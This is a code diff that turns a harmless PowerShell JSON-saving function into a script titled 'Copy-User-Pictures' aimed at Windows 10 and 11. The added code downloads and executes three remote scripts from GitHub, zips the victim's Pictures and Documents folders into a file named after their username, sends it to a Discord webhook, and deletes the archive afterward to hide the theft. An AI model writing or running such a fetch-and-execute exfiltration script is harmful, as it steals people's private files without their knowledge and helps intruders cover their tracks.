@@ -12,8 +12,9 @@
 #  github.com/unwe4p0n1zed                                                tiktok.com/@unwe4p0n1zed                                                                          #
 #  twitter.com/unwe4p0n1zed                                               youtube.com/@unwe4p0n1zed                                                                         #
 #                                                                                                                                                                           #
-#  Title: Save-JSON                                                                                                                                                         #
-#  Description: This PowerShell code save JSON file with given data.                                                                                                        #
+#  Title: Copy-User-Pictures                                                                                                                                                #
+#  Description: This PowerShell code can compress given folder and send it over Discord channel using the provided webhook URL.                                             #
+#  Target: Windows 10, 11                                                                                                                                                   #
 #___________________________________________________________________________________________________________________________________________________________________________#
 #                                             __  __________  _      ______________ __  ________   ___  __________  ____     __                                             #
 #                                            / / / / __/ __/ | | /| / /  _/_  __/ // / / ___/ _ | / _ \/ __/ __/ / / / /    / /                                             #
@@ -21,53 +22,23 @@
 #                                           \____/___/___/   |__/|__/___/ /_/ /_//_/  \___/_/ |_/_/|_/___/_/  \____/____/ (_)                                               #
 #############################################################################################################################################################################
 
-function Save-JSON {
-    param(
-        [CmdletBinding()]
-        [Parameter(Mandatory = $false)]
-        [Alias("p")]
-        [string]$path,
+# get all the scripts needed 
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Compress-Files/Compress-Files.ps1'))
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Upload-Discord/Upload-Discord.ps1'))
+Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/unwe4p0n1zed/Powershell-Scripts/main/Functions/Remove-FileOrFolder/Remove-FileOrFolder.ps1'))
 
-        [Parameter(Mandatory = $true)]
-        [Alias("f")]
-        [string]$filename,
+# set discord webhook url
+$webhookUrl = '<SET_DISCORD_URL_HERE>'
+ 
+# compress files
+$username = (Get-ChildItem Env:\USERNAME).Value
+$zipFileName = "dump-$username.zip"
+$filePath = Compress-Files -sp "\Pictures" -ibdsp $True -dp "\Documents" -ibddp $True -fn $zipFileName;
 
-        [Parameter(Mandatory = $true)]
-        [Alias("d")]
-        [object]$data,
+# send discord message and files
+& Upload-Discord -t "$username dump uploading.." -f $filePath -u $webhookUrl
+ 
+# delete the compressed file from the computer
+Remove-FileOrFolder -ip $filePath -it "File" 
 
-        [Parameter(Mandatory = $false)]
-        [Alias("ibd")]
-        [bool]$includeBaseDirectory = $false
-    )
-
-    # Include base user directory
-    $userDir = Get-Variable HOME -valueOnly
-
-    if ([string]::IsNullOrEmpty($path)){
-        $path = $pwd
-    }
-    elseif ($includeBaseDirectory) {
-        $path = Join-Path $userDir $path
-    }
-
-    # Add .json extension if not provided
-    if (-not $filename.ToLower().Contains(".json")) { 
-        $fileName = $fileName + ".json"
-    }
-
-    # Combine the path and filename
-    $fullPath = Join-Path -Path $path -ChildPath $filename
-    
-    # Create the destination path if it does not exist
-    if (-not (Test-Path $fullPath)) {
-        New-Item -ItemType Directory -Path $fullPath | Out-Null
-    }
-
-    # Convert the data to JSON and save it to the file
-    $data | ConvertTo-Json -Depth 100 | Out-File $fullPath
-
-    Write-Output "Data saved to '$fullPath'"
-
-    return $fullPath
-}
+EXIT
